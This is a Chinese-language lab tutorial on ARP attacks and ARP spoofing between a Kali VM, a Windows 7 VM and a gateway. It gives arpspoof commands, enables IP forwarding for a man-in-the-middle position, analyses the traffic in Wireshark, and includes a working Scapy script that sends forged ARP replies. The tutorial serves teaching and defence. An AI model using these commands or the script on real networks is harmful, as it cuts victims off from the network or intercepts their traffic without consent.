[TOC]



# ==ARP欺骗与攻击==

1、理解ARP攻击与欺骗的原理

2、利用Kali主机相关命令完成攻击和欺骗

3、 利用Kali实施ARP攻击和ARP欺骗

4、利用Scapy完成ARP欺骗和ARP攻击脚本开发

5、本节课带大家使用 Kali Linux 去实施 ARP 攻击与欺骗，并分析流量，当网络中出现了此类攻击，通过流量抓取后分析并实施防御

6、ARP攻击:目的是让某台电脑无法上网，ARP欺骗:让被攻击电脑的流量经过攻击主机。

7、ARP地址解析协议:用于将IP地址转换成MAC地址，进而让交换机可以正确地找到目的地。

## ==基于Kali的ARP攻击与欺骗==

### 一、ARP攻击

##### 1、配置实验环境

（1）准备两台虚拟机，一台Windows7作为被攻击主机，一台Kali作为攻击主机，确保两台主机都能上网，可以互相通信，两台主机都是用NAT模式。

```
Windows7被攻击主机：IP：192.168.230.135  MAC：00:0c:29:74:d6:07  
Kali攻击主机：IP：192.168.230.130  MAC：00:0c:29:e1:69:28
网关：IP：192.168.230.2  MAC：00:50:56:e1:91:d8
```

> 网关可以在被攻击主机上使用 `arp -a` 查看

（2）配置Kali的安装源

这一步网上有很多教程，就是换到中国的源然后更新源即可

（3）安装工具 dsniff

```
apt-get install dsniff
通常情况下该工具已被默认安装
```

##### 2、实施ARP攻击

（1）确定Windows7可以访问公网，并在CMD窗口输入 `arp -a` 命令确认网关IP地址和MAC地址

![image-20240515170602737](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240515170602737.png)

（2）在kali上实施ARP攻击

```
-i 表示接口名称
-t 表示主机目标地址 攻击主机目标MAC地址
┌──(root💀Kali-1)-[~/桌面]
└─# arpspoof -i eth0 -t 192.168.230.135 192.168.230.2 
```

> `arpspoof -i eth0 -t 192.168.230.135 192.168.230.2 `
>
> 解释一下：利用arpspoof工具 -i 指定网络接口，即网卡为 eth0 来欺骗192.168.230.135，告诉他“你的网关是192.168.230.2”，但是192.168.230.2对应的原本的MAC地址为 00:50:56:e1:91:d8 ，现在虽然告诉被攻击主机网关的MAC地址为0:c:29:e1:69:28，这是Kali的MAC地址
>
> ![image-20240515231431899](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240515231431899.png)



> 他会一直发送ARP的回应数据包，而不是询问。所以是直接告诉被攻击主机，攻击主机是网关，于是被攻击主机的数据都会发送到攻击主机上

（3）再回到Windows7主机上查看上网情况（可以看到，该主机已经无法访问网络）

![image-20240515172841576](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240515172841576.png)

##### 3、流量分析

（1）在Windows7主机上使用 Wireshark 工具进行零流量抓取并筛选出 ARP 流量

![image-20240515172536733](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240515172536733.png)

（2）分析流量可以看出，攻击主机向被攻击主机发送ARP响应，并告知被攻击主机这是来自网关的回应（携带了网关的IP地址）

![image-20240515231703593](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240515231703593.png)

携带网关的IP地址，和自己的MAC告诉被攻击主机，我就是你的网关

**但是有一个问题是，攻击主机扮演网关的角色，那真正的网关呢，难道一声不吭嘛，不可能，因此我们还需要欺骗被攻击主机的同时，还要欺骗网关，告诉网关，攻击主机就是那个被攻击的主机，使得网关给被攻击主机发送数据可以直接发给攻击主机**

![image-20240516105821042](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516105821042.png)

相当于直接把被攻击主机和网关隔离开了，而我就是那个中间人

### 二、ARP欺骗

> 现在ARP攻击成功，导致被攻击主机无法上网，但是这不是很异常吗，因此我们现在就需要转发被攻击主机的流量去网关，并回复网关的流量给被攻击主机

##### 1、开启linux的IP转发功能

在ARP攻击的基础上开启 linux 的 IP转发功能，该功能的配置文件是

/proc/sys/net/ipv4/ip_forward ，其内容原本如下

![image-20240516111215887](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516111215887.png)

```
echo 1 >> /proc/sys/net/ipv4/ip_forward
# 这里使用重定向附加的方式在文件中增加内容
```

![image-20240516111243835](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516111243835.png)

此时攻击主机就开启了IP转发的功能，然后在对被攻击主机进行ARP攻击即可

##### 2、欺骗被攻击主机

```
┌──(root💀Kali-1)-[~]
└─# arpspoof -i eth0 -t 192.168.230.135 192.168.230.2
# 这个是欺骗被攻击主机，告诉他我是网关，要发给网关的数据发给我就好
```

![image-20240516112224829](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516112224829.png)

##### 3、欺骗网关

```
┌──(root💀Kali-1)-[~]
└─# arpspoof -i eth0 -t 192.168.230.2 192.168.230.135
# 这个是欺骗网关，我是192.168.230.135，发送给192.168.230.135的数据直接发给我就好
```

![image-20240516112215677](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516112215677.png)

##### 4、ARP欺骗成功

![image-20240516112257374](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516112257374.png)

![image-20240516112404447](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516112404447.png)

此时 `arp -a` 发现网关的MAC地址确实变了，而且还可以正常访问外网，ARP欺骗成功

**当我关闭IP转发功能**

![image-20240516113058381](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516113058381.png)

![image-20240516112939491](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516112939491.png)

被攻击主机就无法成功访问了

## ==基于python代码的Scapy库完成ARP欺骗==

使用scapy编写ARP欺骗

#### 原理：

**攻击主机需要欺骗被攻击主机，让被攻击主机把攻击主机视为网关，这样，出口的流量可以经过该攻击主机（虚假的网关）。另外，攻击主机需要欺骗网关，让网关认为入口流量的目的地就是攻击主机。攻击机 告诉 被攻击主机 我是网关，攻击机 告诉 网关 我就是被攻击主机**

```
Windows7被攻击主机：IP：192.168.230.135  MAC：00:0c:29:74:d6:07  
Kali攻击主机：IP：192.168.230.130  MAC：00:0c:29:e1:69:28
网关：IP：192.168.230.2  MAC：00:50:56:e1:91:d8
```

编写脚本之前我们先通过数据包流量分析一下

#### 1、二层数据包

**欺骗被攻击主机的二层数据包的源MAC是攻击主机的，目的MAC是被攻击主机的**

![image-20240516131053235](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516131053235.png)

**欺骗网关的而成数据包的源MAC是攻击主机的，目的MAC是真正网关的MAC**

![image-20240516131348611](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516131348611.png)

> 二层数据包的源MAC和目的MAC就是按照事实发送的情况，没有任何改变

#### 2、三层ARP数据包

**欺骗被攻击主机的三层ARP数据包的源IP是真正网关的IP，目的IP是被攻击主机的IP**

![image-20240516131640485](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516131640485.png)

**欺骗网关的三层ARP数据包的源IP是被攻击主机的IP，目的IP是真正网关的IP**

![image-20240516131856530](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516131856530.png)

> 

```python
# 攻击机 告诉 被攻击主机 我是网关，攻击机 告诉 网关 我就是被攻击主机
def ARP_spoof():
    iface = 'VMware Network Adapter VMnet8'
    # 被攻击主机的IP和MAC
    target_ip = '192.168.230.135'
    target_mac = '00:0c:29:74:d6:07'

    # 攻击主机的IP和MAC
    spoof_ip = '192.168.230.130'
    spoof_mac = '00:0c:29:e1:69:28'

    # 网关的IP和MAC
    gateway_ip = '192.168.230.2'
    gateway_mac = '00:50:56:e1:91:d8'

    # op=1 表示 ARP request op=2 表示 ARP replay
    # 欺骗被攻击主机的数据包
    spooftargetpkg = Ether(src=spoof_mac,dst=target_mac)/ARP(hwsrc=spoof_mac,psrc=gateway_ip,hwdst=target_mac,pdst=target_ip,op=2)
    sendp(spooftargetpkg, iface=iface, verbose=False)

    # 欺骗网关的数据包
    spoofgatewaypkg = Ether(src=spoof_mac,dst=gateway_mac)/ARP(hwsrc=spoof_mac,psrc=target_ip,hwdst=gateway_mac,pdst=gateway_ip,op=2)
    sendp(spoofgatewaypkg, iface=iface, verbose=False)

    time.sleep(1)


if __name__ == '__main__':
    for i in range(400):
        ARP_spoof()
```

效果如下：

![image-20240516135641861](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516135641861.png)

![image-20240516135806395](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240516135806395.png)